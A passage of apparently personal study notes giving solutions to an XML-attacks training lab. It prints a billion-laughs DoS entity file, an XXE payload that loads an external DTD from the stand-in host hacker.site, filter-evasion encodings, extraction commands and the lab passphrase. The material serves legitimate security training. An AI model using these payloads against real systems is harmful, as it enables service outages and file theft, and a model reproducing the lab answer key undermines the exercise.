+</code></pre><p id="f244aed4-45e2-40cd-bb76-20bc86fa0a32" class="">Decode Unicode characters:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5c5cad28-001e-4908-afaf-9a6cb30754d3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">echo $(php -r &quot;echo html_entity_decode(preg_replace(\&quot;/%u([0-9a-f]{3,4})/i\&quot;,&#x27;&amp;#x\\1;&#x27;,str_replace(&#x27;\u&#x27;, &#x27;%u&#x27;, &#x27;$cleaned&#x27;)),null,&#x27;UTF-8&#x27;);&quot; ;
+</code></pre><p id="df46d1ac-41e1-40f8-9a26-8221161366b7" class="">XEE DoS</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c5d197a2-6569-4ff9-9993-5fbae253a5a7" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">./exploit.sh
+</code></pre><p id="230235e8-aee4-468e-8aa5-990dde107d80" class="">XXE log file extraction</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="21ccefea-5a3e-4858-b6cf-8cb0b9350244" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">./exploit_xxe.sh /var/www/3/%5BLOGS%5D/omg_%C3%A0_dos.log
+</code></pre><h3 id="8e3b76f7-c4d0-4d9b-a86a-a68c89aa512e" class=""><strong>Solutions - Lab#4</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#solutions---lab4"></a></strong></h3><p id="21154c1c-9b44-414f-a337-09cd28ad66a1" class="">XEE+XXE exploitations mixed with filter evasion and character encodings:</p><p id="8b56de16-7ad6-4002-85d4-b775dc792e4f" class=""><em>Ah filters … always throw a spanner in the works.</em> Valid Passphrase</p><p id="204fc001-9104-462b-813a-82166f79acb8" class="">The valid passphrase is Escaping_and_evasion_like_a_boss Exploitation Steps</p><ul id="c285475d-d2ed-4354-b0fd-c14b12f4b1b1" class="bulleted-list"><li style="list-style-type:disc">Testing the login form, youll receive a hint that tells you to visit the stats path.</li></ul><ul id="1c5ece6f-f4b4-4662-a88d-df9908533481" class="bulleted-list"><li style="list-style-type:disc">Open the stats path and check the Physical Memory percentage status.</li></ul><ul id="1a115810-e636-496c-b446-cd86e86eeedd" class="bulleted-list"><li style="list-style-type:disc">Run the Billion laughs attack against the login parser. If the attack works properly, youll notice an alert box with the instructions.</li></ul><blockquote id="5056e0b4-109b-4b81-af75-d389a833cd2f" class="">[NOTE] The server implements some filers to avoid XEE attacks. To exploit the flaw, the fastest solution is to move the Billion laughs attack in an external DTD file hosted on hacker.site (replace it with the IP address of your attacker machine), and then call it as follows:</blockquote><p id="e4d6de3b-db9e-4507-85cf-7231c304aa33" class="">xml payload</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="787e928f-4974-4577-8e2d-36c0dc82bac5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE results [
+    &lt;!ENTITY % EvilDTD PUBLIC &quot;xxe&quot;
+        &quot;http://hacker.site/evil_remote_xee.dtd&quot;&gt;
+    %EvilDTD;
+]&gt;
+&lt;login&gt;
+    &lt;username&gt;XEEME &amp;file;&lt;/username&gt;
+    &lt;password&gt;password&lt;/password&gt;
+&lt;/login&gt;
+</code></pre><blockquote id="e75ff070-d559-42ab-8d27-d6d910ec63a0" class="">[Note] make sure to replace hacker.site with the IP address of your attacker machine.</blockquote><p id="4d02a857-c710-4bad-b6b8-0ac4af427219" class="">file: evil_remote_xee.dtd</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e2074390-9554-4f3c-a7aa-4969e8db5e85" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;!ENTITY lol &quot;lol&quot;&gt;
+&lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
+&lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;
+&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
+&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
+&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
+&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
+&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
+&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
+&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;
+</code></pre><p id="68cfa297-d645-47b0-981e-4d34c0af18db" class="">Run an XXE attack to read the log file and clear useless text.</p><blockquote id="ac735e79-b10f-4d11-847b-35eb7989d3a0" class="">[NOTE] Due to some restrictions, to prevent XEE attacks, long URLs might break the payload. To bypass this limitation, we can move the payload in another external dtd as we did before.</blockquote><p id="1e3c91fb-e97d-4bf3-a9e0-cb4b14798ab0" class="">Encode the log path:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="97a9ab6d-255f-4fbc-893b-0f0ab4168091" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">%7B%5B_%C4%BF.%C3%B2.%C4%9D.%C5%9B_%5D%7D%2F%F0%9D%95%86%E3%8E%8E%E2%80%A6%C3%A0%E2%80%A2d%F0%9D%93%B8s.%E3%8F%92
+</code></pre><p id="d3dfa21e-6e21-4723-a30c-8c6323264c15" class="">Extract the content from the result. Use awk or gawk, depends on the system:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="07998f2a-5622-4c75-b17c-ff00f4099780" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">gawk &#x27;match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;\s/, m) { print m[1] }&#x27;
+</code></pre><p id="baa562b3-cc05-430a-b538-84dba9ba555e" class="">Remove JSON escaping characters:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cb0f07fb-22de-417d-9dc1-5fc18d21a83e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sed &#x27;s/\\\//\//g&#x27;
+</code></pre><p id="3fd78b91-4ac1-4af1-b864-7208154800ed" class="">Useful Files:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="71c473b8-f19c-44e4-b41d-cd147597c331" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">exploit.sh
+exploit_xxe.sh
+external_dos.dtd
+evil_remote_xee.dtd
+</code></pre><ul id="0ca872bc-1827-4843-8f3a-45b47c8be850" class="bulleted-list"><li style="list-style-type:disc">XEE DoS *</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="686e5e6d-9d91-4ae9-8dcb-df8c49f2c782" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">file: exploit.sh
+./exploit.sh
+</code></pre><ul id="49835a76-edf1-4825-8afd-db249fbaaf61" class="bulleted-list"><li style="list-style-type:disc">XXE log file extraction *</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="afdf0d48-3146-4a52-99bd-90f028bd1860" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">file: exploit_xxe.sh
+./exploit_xxe.sh</code></pre></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
